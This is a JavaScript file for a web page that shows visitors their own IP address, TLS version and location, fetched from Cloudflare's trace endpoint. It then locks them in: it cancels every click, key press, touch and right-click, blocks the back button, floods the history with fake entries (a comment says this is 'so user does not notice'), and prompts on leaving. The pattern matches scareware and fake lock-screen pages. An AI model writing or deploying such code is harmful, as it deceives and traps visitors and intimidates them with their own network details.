async function getCloudflareJSON() {
  let data = await fetch('https://1.1.1.1/cdn-cgi/trace').then(res => res.text())
  let arr = data.trim().split('\n').map(e => e.split('='))
  return Object.fromEntries(arr)
}

window.ua = window.UAParser(navigator.userAgent);
let interactionCount = 0

getCloudflareJSON().then((data) => {
  document.getElementsByClassName('ip')[0].innerHTML = data['ip']
  document.getElementsByClassName('tls')[0].innerHTML = data['tls']
  document.getElementsByClassName('http')[0].innerHTML = data['http']
  document.getElementsByClassName('sni')[0].innerHTML = data['sni']
  document.getElementsByClassName('loc')[0].innerHTML = data['loc']
})

window.addEventListener('load', function() {
  document.body.style.cursor = 'default';
  blockBackButton()
  fillHistory()

  interceptUserInput(event => {
    disableEvent(event)
  })
});

function requestPointerLock() {
  const requestPointerLockApi = (
    document.body.requestPointerLock ||
    document.body.webkitRequestPointerLock ||
    document.body.mozRequestPointerLock ||
    document.body.msRequestPointerLock
  )

  requestPointerLockApi.call(document.body)
}

function disableEvent(e) {
  if (e.stopPropagation) {
    e.stopPropagation();
  } else if (window.event) {
    window.event.cancelBubble = true;
  }
  e.preventDefault();
  return false;
}

function fadeIn() {

  setTimeout(function() {
    getCloudflareJSON().then((data) => {
      let e = document.getElementsByClassName('ip');
      for (let i = 0; i < e.length; i++) {
        e[i].style.opacity = '1';
      }
      document.getElementsByClassName('ip')[0].innerHTML = 'IP: ' + data['ip'];
    })
  }, 1100);
}

function interceptUserInput(onInput) {
  document.body.addEventListener('touchstart', onInput, {
    passive: false
  })

  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)

  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)

  document.addEventListener('contextmenu', onInput)
}

function hideCursor () {
  document.querySelector('html').style = 'cursor: none;'
}

window.addEventListener('beforeunload', event => {
  event.returnValue = true
})

function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  // Set location back to the initial location, so user does not notice
  window.history.pushState({}, '', window.location.pathname)
}